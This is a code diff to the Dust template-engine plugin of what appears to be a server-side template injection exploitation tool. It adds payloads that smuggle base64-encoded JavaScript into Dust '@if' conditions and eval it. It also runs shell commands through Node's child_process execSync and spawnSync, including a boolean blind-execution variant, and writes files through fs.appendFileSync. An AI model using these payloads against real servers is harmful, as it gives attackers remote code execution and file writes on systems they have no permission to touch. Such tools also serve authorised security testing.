@@ -46,6 +46,10 @@ class Dust(javascript.Javascript):
             'evaluate_error': {
                 'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
             },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """0{{@if cond="[''][0+!eval(Buffer('{code_b64p}', 'base64').toString())]['length']"}}{{/if}}"""
+            },
             'evaluate_blind': {
                 'call': 'inject',
                 'evaluate_blind': """{{@if cond="eval(Buffer('{code_b64p}', 'base64').toString())"}}{{/if}}"""
@@ -55,10 +59,11 @@ class Dust(javascript.Javascript):
                 'exfiltrate': 'base64',
                 'execute': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())""",
             },
-            'write': {
-                'call': 'evaluate',
-                'write': """require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')""",
-                'truncate': """require('fs').writeFileSync('{path}', '')"""
+            'execute_boolean': {
+                'call': 'evaluate_blind',
+                # spawnSync() shell option has been introduced in node 5.7, so this will not work with old node versions.
+                # TODO: use another function.
+                'execute_blind': """require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
             },
             'execute_blind': {
                 'call': 'evaluate_blind',
@@ -67,7 +72,12 @@ class Dust(javascript.Javascript):
                 'execute_blind': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}');""",
                 'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                 'test_cmd_expected': rand.randstrings[2]
-            }
+            },
+            'write': {
+                'call': 'evaluate',
+                'write': """require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')""",
+                'truncate': """require('fs').writeFileSync('{path}', '')"""
+            },
         })
 
         self.set_contexts([
